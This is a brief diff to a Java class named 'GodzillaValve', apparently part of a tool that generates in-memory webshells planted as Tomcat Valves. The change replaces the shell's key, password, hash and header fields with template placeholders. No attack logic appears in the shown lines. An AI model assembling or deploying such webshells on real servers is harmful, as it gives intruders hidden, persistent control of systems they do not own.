@@ -17,11 +17,11 @@ import java.io.IOException;
 public class GodzillaValve extends ClassLoader implements Valve {
     protected Valve next;
     protected boolean asyncSupported;
-    public String key;
-    public String pass;
-    public String headerName;
-    public String headerValue;
-    public String md5;
+    public String key = "{{key}}";
+    public String pass = "{{pass}}";
+    public String md5 = "{{md5}}";
+    public String headerName = "{{headerName}}";
+    public String headerValue = "{{headerValue}}";
 
     public GodzillaValve() {
     }
